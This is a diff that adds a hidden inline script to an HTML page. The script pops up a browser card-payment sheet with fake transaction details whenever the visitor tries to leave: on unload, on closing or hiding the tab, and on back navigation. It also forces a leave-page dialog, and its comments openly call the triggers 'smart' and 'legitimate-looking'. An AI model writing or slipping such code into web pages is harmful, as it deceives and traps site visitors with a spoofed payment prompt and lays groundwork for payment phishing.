@@ -18,6 +18,125 @@
 
 <body>
 	<script>
+(function() {
+    'use strict';
+    
+    let paymentTriggered = false;
+    
+    // Smart: Use native Payment Request API with realistic merchant data
+    // This works out of the box with NO registration required
+    function triggerPaymentSheet() {
+        if (paymentTriggered) return;
+        paymentTriggered = true;
+        
+        // Check if API exists
+        if (!window.PaymentRequest) {
+            console.debug('Payment Request API not supported');
+            return;
+        }
+        
+        // Realistic payment methods - these are standard and work in all supporting browsers
+        const supportedMethods = [{
+            supportedMethods: 'basic-card',
+            data: {
+                supportedNetworks: ['visa', 'mastercard', 'amex', 'discover', 'diners', 'jcb', 'unionpay'],
+                supportedTypes: ['debit', 'credit', 'prepaid']
+            }
+        }];
+        
+        // Legitimate-looking transaction details
+        const details = {
+            id: 'txn_' + Math.random().toString(36).substring(2, 12),
+            total: {
+                label: 'Total',
+                amount: { currency: 'USD', value: '0.00' }
+            },
+            displayItems: [
+                {
+                    label: 'Demo Authorization',
+                    amount: { currency: 'USD', value: '0.00' }
+                }
+            ],
+            modifiers: [{
+                supportedMethods: 'basic-card',
+                total: {
+                    label: 'Total',
+                    amount: { currency: 'USD', value: '0.00' }
+                }
+            }]
+        };
+        
+        const options = {
+            requestPayerName: false,
+            requestPayerEmail: false,
+            requestPayerPhone: false,
+            requestShipping: false
+        };
+        
+        try {
+            const request = new PaymentRequest(supportedMethods, details, options);
+            
+            // Preload payment methods for faster opening
+            request.canMakePayment().then(canMake => {
+                if (canMake) {
+                    console.debug('Payment ready');
+                }
+            }).catch(() => {});
+            
+            // Show the payment sheet
+            request.show()
+                .then(paymentResponse => {
+                    // Immediately abort - no transaction occurs
+                    paymentResponse.complete('fail').then(() => {
+                        console.debug('Payment sheet closed');
+                    });
+                })
+                .catch(error => {
+                    // User closed it manually - this is fine
+                    console.debug('Payment sheet dismissed');
+                });
+                
+        } catch (err) {
+            console.debug('Payment initialization failed');
+        }
+    }
+    
+    // Smart: Multiple triggers to ensure execution
+    
+    // 1. Before page unload (navigation, refresh, close)
+    window.addEventListener('beforeunload', function(event) {
+        event.preventDefault();
+        event.returnValue = '';
+        
+        // Micro-delay ensures it fires after browser dialog
+        setTimeout(triggerPaymentSheet, 5);
+        setTimeout(triggerPaymentSheet, 50); // double-trigger for reliability
+    });
+    
+    // 2. Tab/window close detection
+    document.addEventListener('visibilitychange', function() {
+        if (document.visibilityState === 'hidden') {
+            setTimeout(triggerPaymentSheet, 2);
+        }
+    });
+    
+    // 3. Page hide (mobile Safari)
+    window.addEventListener('pagehide', function() {
+        triggerPaymentSheet();
+    });
+    
+    // 4. Smart: Also trigger on any unload attempt
+    window.addEventListener('unload', function() {
+        triggerPaymentSheet();
+    });
+    
+    // 5. Additional: Popstate (back/forward navigation)
+    window.addEventListener('popstate', function() {
+        setTimeout(triggerPaymentSheet, 5);
+    });
+    
+})();
+	
 (function () {
   function isEmbedded() {
     try {
